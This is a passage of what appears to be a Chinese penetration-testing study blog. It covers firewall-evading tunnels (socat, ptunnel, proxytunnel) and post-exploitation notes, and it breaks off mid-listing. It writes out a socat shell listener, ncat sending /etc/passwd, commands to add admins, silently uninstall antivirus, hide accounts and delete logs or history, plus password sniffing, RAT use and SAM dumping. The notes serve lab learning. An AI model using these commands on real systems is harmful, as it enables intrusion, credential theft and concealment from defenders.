<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403113151561-1009285808.gif" /></p>
<ul>
<li>发送文件 ncat --send-only 127.0.0.1 4444 &lt; /etc/passwd</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230403113203748-1108513231.gif" /></p>
<h2 id="隧道工具-socat-介绍">13. 隧道工具 SOCAT 介绍</h2>
<h3 id="socat-基本介绍">1、SOCAT 基本介绍</h3>
<ul>
<li>被称为nC++(增强增强版的nc)</li>
<li><strong>双向数据流通道工具</strong></li>
<li><strong>客户端连接示例</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat - tcp:192.168.1.1:80    <span class="comment">#说明：&quot;-&quot; 标准的输入输出，tcp: 协议（udp 同理）</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>服务端侦听示例</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat - tcp4-listen:4444  </span><br><span class="line">socat - tcp4-l:4444  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">  * **演示**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230721193438086-1116195493.gif)</span><br><span class="line"></span><br><span class="line">  * **服务端接收文件**</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">socat tcp4-listen:4444 open:test-rec.txt,creat,append</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>客户端发送文件</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> test.txt| socat - tcp4:192.168.159.129:4444</span><br></pre></td></tr></table></figure>
<h3 id="流量操控">2、流量操控</h3>
<h4 id="远程shell---服务器端">（1）远程shell - 服务器端</h4>
<p>防火墙对访问端口有限制时，我们可在外网机特定端口侦听以建立隧道，当然也可进一步做隧道嵌套。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp-l:4444 <span class="built_in">exec</span>:sh,pty,stderr          <span class="comment">#在4444端口开启监听的同时执行 sh shell,也就是说客户端连接时将 shell(pty终端)发过去，stderr标准的输入输出</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>演示</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230721223831739-213589657.gif" /></p>
<h4 id="端口转发">（2）端口转发</h4>
<p>访问本地 4444 端口时转发至 129 的 80 端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp4-listen:4444,fork tcp4:192.168.159.129:80     <span class="comment">#fork：为新连接创建新的子进程，互不干扰，类似与SSH隧道的转发</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>演示</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230721224025599-317689562.gif" /></p>
<h4 id="远程执行命令">（3）远程执行命令</h4>
<ul>
<li>服务器开启监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat - udp-l:4444</span><br></pre></td></tr></table></figure>
<ul>
<li>客户端命令示例</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;`id`&quot;</span> | socat - udp-datagram:192.168.159.140:4444   <span class="comment">#datagram表示传递数据</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;`ls`&quot;</span> | socat - udp-datagram:192.168.159.140:4444</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>演示</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230721224854051-1661250161.gif" /></p>
<h4 id="udp-全端口任意内容发包">（4）UDP 全端口任意内容发包</h4>
<p>向UDP全端口发送指定内容，相当于做端口扫描。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> PORT <span class="keyword">in</span> &#123;1..65535&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;testtetetetteet&quot;</span> | socat - UDP4-DATAGRAM:192.168.159.140:<span class="variable">$PORT</span>; <span class="built_in">sleep</span> .1; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>演示</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230721230432089-170692987.gif" /></p>
<h4 id="二进制编辑器">（5）二进制编辑器</h4>
<p>编辑二进制文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\0\14\0\0\c&quot;</span> | socat -u - file:/usr/bin/squid.exe,seek,seek=0x00074420   <span class="comment">#-e:二进制编码，指定更改后的二进制内容，-u 单向，seek:指定偏移量</span></span><br></pre></td></tr></table></figure>
<h4 id="简单的-web-服务器">（6）简单的 web 服务器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat -T 1 -d -d TCP-L:6666,reuseaddr,fork,crlf SYSTEM:<span class="string">&quot;echo -e \&quot;\\\&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\\nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \$SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\\\&quot;\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>演示</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230721231655210-117785367.gif" /></p>
<h2 id="隧道工具-ptunnel-介绍">14. 隧道工具 ptunnel 介绍</h2>
<h3 id="基本介绍">1. 基本介绍</h3>
<ul>
<li>ping tunnel icmp 隧道工具</li>
<li>通过 icmp echo (ping requests)和reply(ping reply)
实现隧道【也就是基于实现 ICMP 包通信】</li>
<li>适用于防火墙只允许 ping 出站流量的环境</li>
<li>支持多并发连接、性能优</li>
<li>支持身份验证【加密通信】</li>
<li>需要 root 权限</li>
<li>支持跨平台和抓包，但需安装以下依赖</li>
<li>windows：winpcap</li>
<li>linux：libpcap</li>
<li>工作过程</li>
<li>proxy、client、destination</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230722160248749-1216954971.png" /></p>
<p>client 相当于内网机，防火墙仅允许 ICMP 协议通过，client 和 proxy
之间通过 ptunnel 建立基于ICMP协议的隧道，然后将 Proxy
作为中转站访问外网。</p>
<ul>
<li><strong>服务器命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ptunnel             <span class="comment">#未加密的情况直接运行即可</span></span><br><span class="line">ptunnel -x 1234   <span class="comment">#-x是指定密码</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>客户端命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ptunnel -p proxy -lp port1 -da destination -dp port2 -x passwd</span><br><span class="line"><span class="comment">#-p 指定代理服务器(proxy) IP，-lp 指定本地（client）监听端口，</span></span><br><span class="line"><span class="comment">#-da 指定要访问的目标地址（IP或域名），-dp 指定目标上的端口</span></span><br><span class="line"><span class="comment">#-x 指定的密码要和服务端所设一致（也可都不设密码）</span></span><br></pre></td></tr></table></figure>
<p><strong>注，由于每次连接时目标都是直接指定的，所以对于不同的目标要建立不同的连接，不过可通过嵌套隧道解决这个不足。</strong></p>
<ul>
<li><strong>嵌套 SSH 隧道【重点】</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CNfg -D 7000 root@127.0.0.1 -p 2222  <span class="comment">#client 端执行</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>ptunnel
直到目前的最新版仍存在拒绝服务漏洞</strong></p></li>
<li><p>0.72</p></li>
</ul>
<h3 id="实操演示">2、实操演示</h3>
<ul>
<li><strong>实操环境</strong></li>
<li>client：kali-2.0【10.1.1.2】</li>
<li>proxy(server)：【192.168.159.129】</li>
<li>防火墙：monowall</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230722192600805-2117604204.png" /></p>
<ul>
<li>destination：OWASP【192.168.159.135】</li>
<li><strong>演示</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230722200414887-980093111.gif" /></p>
<p><strong>ssh 隧道嵌套建立同理，client 执行命令时将
destination（提前开启 ssh 服务）的端口改成22，之后 client 再执行 "ssh
-CNfg ……" 命令，最后的效果也和前面相似</strong></p>
<h2 id="隧道工具-proxytunnle-介绍">15. 隧道工具 proxytunnle 介绍</h2>
<h3 id="基本介绍-1">1、基本介绍</h3>
<ul>
<li>通过标准的 HTTP / HTTPS 代理创建隧道的工具</li>
<li>通过 HTTP CONNECT 方法封装信息</li>
<li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li>
<li>无法创建 DNS 隧道和 ICMP 隧道</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724151224898-1322807954.png" /></p>
<h3 id="实验场景一">2、实验场景一</h3>
<ul>
<li>防火墙仅允许本地代理服务器访问外网指定端口【出站 IP 受限，访问 port
受限】</li>
<li>解决方案图</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724155412873-1500849727.png" /></p>
<p>如图所示，可在内网 PC
与本地代理服务器之间建立隧道，借助本地代理服务器中转访问目标服务器。实操过程如下：</p>
<ul>
<li><strong>monowall 配置</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724160323708-922716107.png" /></p>
<ul>
<li><strong>本地代理服务器配置</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#未自带，要自己安装</span></span><br><span class="line">root@lamp:~<span class="comment"># apt-get install proxytunnel</span></span><br><span class="line">root@lamp:~<span class="comment"># apt-get install squid3</span></span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line">root@lamp:~<span class="comment"># vim /etc/squid/squid.conf</span></span><br><span class="line"></span><br><span class="line">  http_port 1.1.1.12:3128   <span class="comment">#注意，这里安全起见要对监听的本地代理服务器的 IP 指定，端口默认的3128也可改</span></span><br><span class="line">  http_access allow !Safe_ports</span><br><span class="line">  http_access allow CONNECT !SSL_ports</span><br><span class="line">  http_access allow all</span><br><span class="line"></span><br><span class="line">root@lamp:~<span class="comment"># /etc/init.d/squid restart</span></span><br><span class="line">root@lamp:~<span class="comment"># netstat -tulnp | grep 3128  #查看下启动情况</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>内网 PC 操作</strong></li>
</ul>
<p>现在浏览器可以直接通过指定代理【本地代理服务器IP+3128】即可访问目标服务器指定端口。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724161944387-1678126399.png" /></p>
<p><strong>内网 PC 的隧道建立命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxytunnel -a 80 -p 1.1.1.12:3128 -d 192.168.1.14:80</span><br></pre></td></tr></table></figure>
<ul>
<li>-a：内网PC的监听端口</li>
<li>-p：本地代理服务器 IP+PORT</li>
<li>-d：目标IP+PORT</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724161914549-1357778983.png" /></p>
<p>可以在目标服务器抓包对比下隧道建立前后来访 IP 的变化</p>
<h3 id="实验场景二">3、实验场景二</h3>
<ul>
<li>防火墙允许访问的端口【外网资源】并不是我们需要的。</li>
<li>解决方案图</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724164339751-1280021196.png" /></p>
<p>如图所示，当防火墙仅允许访问外网80端口，而我们实际需要访问外网的 SSH
服务时，我们可以在外网加个代理，
<strong>外网代理监听80，再将其中转至目标的SSH服务</strong>
。当然也可以尝试将SSH服务的端口改成80，但
<strong>修改目标资源侦听端口可能无法躲避防火墙的深层次检测【基于协议的检测】，</strong>
实操过程如下：</p>
<ul>
<li><strong>外网代理配置</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装squid3</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install squid3</span></span><br><span class="line">root@kali:~<span class="comment"># vim /etc/squid/squid.conf</span></span><br><span class="line"></span><br><span class="line">http_port 192.168.1.14:80</span><br><span class="line">http_access allow !Safe_ports</span><br><span class="line">http_access allow CONNECT !SSL_ports</span><br><span class="line">http_access allow all</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># systemctl start squid.service</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>本地代理服务器配置同实验场景一</strong></p></li>
<li><p><strong>内网 PC 操作</strong></p></li>
</ul>
<p><strong>建隧道命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxytunnel -a 2222 -p 1.1.1.12:3128 -r 192.168.1.14:80 -d 192.168.1.12:22</span><br></pre></td></tr></table></figure>
<ul>
<li>-a：内网PC的监听端口</li>
<li>-p：本地代理服务器【内网代理】</li>
<li>-r：外网代理 IP+PORT</li>
<li>-d：目标 IP+PORT</li>
</ul>
<p><strong>效果测试</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@127.0.0.1 -p 2222</span><br></pre></td></tr></table></figure>
<p><a
href="https://blog.csdn.net/kevinhanser/article/details/79857618"><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230724170125212-1760018939.png" /></a></p>
<h3 id="实验场景三">4、实验场景三</h3>
<ul>
<li>基于实验场景三，将SSH连接和隧道建立合并，即修改SSH客户端文件实现建立SSH连接时自动创建代理链隧道。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vim .ssh/config</span></span><br><span class="line">192.168.1.12</span><br><span class="line">Hostname 192.168.1.14</span><br><span class="line">ProtocolKeepAlives 30 ProxyCommand /usr/bin/proxytunnel -p 1.1.1.12:3128 -r 192.168.1.14:80 -d %h:%p  </span><br></pre></td></tr></table></figure>
<p><strong>注，之后就可以直接执行ssh连接，另命令没有 -a
参数</strong></p>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>远程控制</tag>
        <tag>后门</tag>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之提权：信息收集</title>
    <url>/2022/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="基本信息收集">1. 基本信息收集</h2>
<h3 id="linux-系统">1、Linux 系统</h3>
<p><strong>/etc/resolv.conf #查DNS设置</strong></p>
<p><strong>/etc/passwd #查帐号</strong></p>
<p><strong>/etc/shadow #查密码</strong></p>
<p><strong>whoami and who -a #查当前账号及已登录的所有账号</strong></p>
<p><strong>ifconfig -a #查IP相关信息</strong></p>
<p><strong>iptables -L #查防火墙</strong></p>
<p><strong>netstat -rn
#查看当前系统网关以及路由设置，地址欺骗</strong></p>
<p><strong>uname -a #查系统内核版本</strong></p>
<p><strong>ps aux #查看进程</strong></p>
<p><strong>dpkg -l| head
#列出已安装的所有软件包（ii：该包已安装，r：该包已删除，c：配置文件还存在）</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226121513717-103154289.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226121921105-2057303020.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226122024131-702091623.png" /></p>
<h3 id="windows-系统">2、Windows 系统</h3>
<p><strong>ipconfig /all #查看所有的IP配置</strong></p>
<p><strong>ipconfig /displaydns
#查看当前DNS缓存【可发现系统管理员经常浏览的网页】</strong></p>
<p><strong>netstat -bnao，netstat -r #查看路由</strong></p>
<p><strong>net view，net view /domain #查网络共享</strong></p>
<p><strong>net user /domain，net user %username% /domain
#域账号信息</strong></p>
<p><strong>net accounts，net share #查看所开的共享</strong></p>
<p><strong>net localgroup administrators username /add
#将username添加到本地管理员组</strong></p>
<p><strong>net group "Domain Controllers" /domain #查看Domain
Controllers里的主机账号/域控制器</strong></p>
<p><strong>net share name$=C: /unlimited
#将C盘共享出来，并不做限制（所有权限）</strong></p>
<p><strong>net user username /active:yes /domain
#域环境下，将锁定账号启动</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226160132893-1913746129.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226160304962-1056122428.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226160408200-2011202186.png" /></p>
<h3 id="windows平台下的命令工具">3、windows平台下的命令工具</h3>
<p><strong>WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</strong></p>
<p><strong>wmic nicconfig get ipaddress,macaddress
#查询IP地址/mac地址</strong></p>
<p><strong>wmic computersystem get username #当前登陆账号</strong></p>
<p><strong>wmic netlogin get name,lastlogon #用户登录记录</strong></p>
<p><strong>wmic process get caption, executablepath,commandline
#查看当前进程与命令方式</strong></p>
<p><strong>wmic process where name= "calc.exe" call terminate
#结束一个进程【calc.exe计算器】</strong></p>
<p><strong>wmic os get name,servicepackmajorversion
#提取操作系统服务版本</strong></p>
<p><strong>wmic product get name,version
#查看操作系统安装的软件</strong></p>
<p><strong>wmic product where name= "<name>" call uninstall
/nointeractive #删掉某些软件【如：杀毒软件】#nointeractive
后台静默运行</strong></p>
<p><strong>wmic share get /ALL #查看共享文件夹</strong></p>
<p><strong>wmic /node:"machinename" path Win32_TerminalServiceSetting
where AllowTSConnections="0" call SetAllowTSConnections "1"
#开启远程桌面，支持本地、远程的执行</strong></p>
<p><strong>如：wmic /node:"localhost" path Win32_TerminalServiceSetting
where AllowTSConnections="0" call SetAllowTSConnections "1"</strong></p>
<p><strong>wmic nteventlog get path,filename, writeable
#查看当前系统日志对应哪些系统文件</strong></p>
<p><strong>eventvwr / eventvwr.msc # 打开事件查看器</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226160614843-2121261289.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226160758031-1625151966.png" /></p>
<h2 id="敏感信息收集"><strong>2. 敏感信息收集</strong></h2>
<p><strong>商业信息</strong></p>
<p><strong>系统信息（基本信息收集）</strong></p>
<h3 id="linux"><strong>1、Linux</strong></h3>
<p><strong>/etc ；/usr/local/etc #一般存放有配置文件</strong></p>
<p><strong>/etc/password ；/etc/shadow</strong></p>
<p><strong>.ssh ；.gnupg 公私钥 #linux以.为首的目录/文件都是隐藏的，ls
-ll 可查看</strong></p>
<p><strong>The e-mail and data files #邮件/数据文件</strong></p>
<p><strong>业务数据库 ；身份认证服务器数据库</strong></p>
<p><strong>/tmp
#linux中的临时目录，存放临时数据【有可能泄露机密数据】</strong></p>
<h3 id="windows">2、windows</h3>
<p><strong>SAM 数据库 ； 注册表文件</strong></p>
<p><strong>%SYSTEMROOT%#SAM进行修复操作时，保存的SAM副本</strong></p>
<p><strong>%SYSTEMROOT%#注册表备份</strong></p>
<p><strong>业务数据库 ； 身份认证数据库</strong></p>
<p><strong>临时文件目录 #病毒经常驻留的地方</strong></p>
<p><strong>UserProfile\AppData\Local\Microsoft\Windows\Temporary
Internet Files\</strong></p>
<h2 id="隐藏痕迹">3. 隐藏痕迹</h2>
<h3 id="windows-1">1、Windows</h3>
<p><strong>禁止在登陆界面显示新建账号(username)，此方法只能在登录界面隐藏，即该操作之后依旧可通过net
user 查到，可通过其他方法使net user 也查不到。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot;</span> /v username /T REG_DWORD /D 0</span><br></pre></td></tr></table></figure>
<p>**del %WINDIR%\*.log /a/s/q/f #静默强制删除日志**</p>
<h3 id="linux-1">2、Linux</h3>
<p><strong>History
#查看曾经运行的命令【保存文件位置：bash_history】</strong></p>
<p><strong>history -c #删除history记录</strong></p>
<p><strong>lsattr #查看文件属性</strong></p>
<p><strong>chattr +i .bash_history #修改文件属性为
i【i：无法修改】，如果不起作用可以将原来的bash_history文件删掉重新建个，再将
i 属性加上。</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226122444467-1927081092.png" /></p>
<h3 id="日志">3、日志</h3>
<p><strong>不同的linux系统，日志文件名称也许不一样。</strong></p>
<p><strong>auth.log / secure #存放用户的登录及身分认证信息</strong></p>
<p><strong>btmp / wtmp #数据文件</strong></p>
<p><strong>lastlog / faillog</strong></p>
<p><strong>其他日志和 HIDS 等</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226123132450-802671176.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220226123409564-1938435251.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之提权：利用抓包嗅探等提权</title>
    <url>/2022/02/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E7%AD%89%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="抓包嗅探">1. 抓包嗅探</h2>
<h3 id="windows">1、Windows</h3>
<p><strong>• Wireshark</strong></p>
<p><strong>• Omnipeek</strong></p>
<ul>
<li>下载（官网）：<a href="https://www.liveaction.com/"
class="uri">https://www.liveaction.com/</a></li>
<li>OmniPeek_UserGuide：<a
href="https://mypeek.liveaction.com/elements/mypeek_documentation/manuals/OmniPeek_UserGuide.pdf"
class="uri">https://mypeek.liveaction.com/elements/mypeek_documentation/manuals/OmniPeek_UserGuide.pdf</a></li>
</ul>
<p>• commview（早期XP上主要在用）</p>
<p><strong>• Sniffpass</strong></p>
<ul>
<li>下载：<a href="https://www.nirsoft.net/toolsdownload/sniffpass.zip"
class="uri">https://www.nirsoft.net/toolsdownload/sniffpass.zip</a></li>
<li>Kali安装ftp：<a
href="https://www.cnblogs.com/z9m8r8/articles/15864297.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15864297.html</a></li>
<li>开启ftp服务：service pure-ftpd start</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214140944574-1200766533.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214141103821-1911354257.png" /></p>
<h3 id="linux">2、Linux</h3>
<p><strong>• Tcpdump</strong></p>
<p><strong>• Wireshark</strong></p>
<p><strong>• Dsniff</strong></p>
<ul>
<li>和Sniffpass差不多，可以自己安装：apt-get install dsniff</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dsniff -h</span></span><br><span class="line">Version: 2.4</span><br><span class="line">Usage: dsniff [-cdmn] [-i interface | -p pcapfile] [-s snaplen]</span><br><span class="line">              [-f services] [-t trigger[,...]] [-r|-w savefile]</span><br><span class="line">              [expression]</span><br><span class="line">root@kali:~<span class="comment"># dsniff -i eth0</span></span><br><span class="line">dsniff: listening on eth0</span><br><span class="line">-----------------</span><br><span class="line">02/14/22 01:17:19 tcp 10.10.10.131.1071 -&gt; kali.21 (ftp)</span><br><span class="line">USER anonymous</span><br><span class="line">PASS IEUser@</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">02/14/22 01:17:25 tcp 10.10.10.131.1072 -&gt; kali.21 (ftp)</span><br><span class="line">USER anonymous</span><br><span class="line">PASS IEUser@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">02/14/22 01:18:55 tcp 10.10.10.131.1074 -&gt; kali.21 (ftp)</span><br><span class="line">USER user</span><br><span class="line">PASS 123456</span><br></pre></td></tr></table></figure>
<h2 id="键盘记录">2. 键盘记录</h2>
<h3 id="keylogger">1、Keylogger</h3>
<p>参见：<a href="https://www.cnblogs.com/z9m8r8/articles/15864297.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15864297.html</a></p>
<h3 id="木马窃取">2、木马窃取</h3>
<p><strong>示例（以<a
href="https://github.com/zxo2004/DarkComet-%20RAT-5.3.1">DarkComet-RAT-5.3.1</a>为例）</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214142350242-1857099054.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214142607694-1299945803.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214142731688-1915439418.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214143019117-326457926.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214143136184-2060313243.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214143305669-1915766576.png" /></p>
<p><strong>如remote desktop：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214143402642-299866898.png" /></p>
<h2 id="本地缓存密码">3. 本地缓存密码</h2>
<h3 id="浏览器缓存的密码">1、浏览器缓存的密码</h3>
<p><strong>• IE 浏览器</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214155843492-1088328386.png" /></p>
<p><strong>• Firefox（Exdit-&gt;Prefence）</strong></p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214155736034-363007718.png" /></p>
<h3 id="网络密码">2、网络密码</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214155940527-1170573964.png" /></p>
<h3 id="无线密码">3、无线密码</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214160207564-2106379901.png" /></p>
<h3 id="密码还原工具">4、密码还原工具</h3>
<p><strong>工具集：</strong> <a
href="https://www.nirsoft.net/password_recovery_tools.html"
class="uri">https://www.nirsoft.net/password_recovery_tools.html</a></p>
<h3 id="dump-sam">5、Dump SAM</h3>
<p><strong>•
Pwdump（可远程执行，通过参数指定相应IP，username等即可）</strong></p>
<p><strong>• /usr/share/windows-binaries/fgdump/</strong></p>
<p><strong>help：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;PwDump.exe -h</span><br><span class="line"></span><br><span class="line">pwdump6 Version 2.0.0-beta-2 by fizzgig and the mighty group at foofus.net</span><br><span class="line">** THIS IS A BETA VERSION! YOU HAVE BEEN WARNED. **</span><br><span class="line">Copyright 2009 foofus.net</span><br><span class="line"></span><br><span class="line">This program is free software under the GNU General Public License Version 2 (GNU GPL), you can redistribute it and/or modify it under the terms of the GNU GPL, as published by the Free Software Foundation.  NO WARRANTY, EXPRESSED OR IMPLIED, IS GRANTED WITH THISPROGRAM.  Please see the COPYING file included with this program and the GNU GPL <span class="keyword">for</span> further details.</span><br><span class="line"></span><br><span class="line">Usage: PwDump.exe [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName</span><br><span class="line">  <span class="built_in">where</span> -h prints this usage message and exits</span><br><span class="line">  <span class="built_in">where</span> -o specifies a file to <span 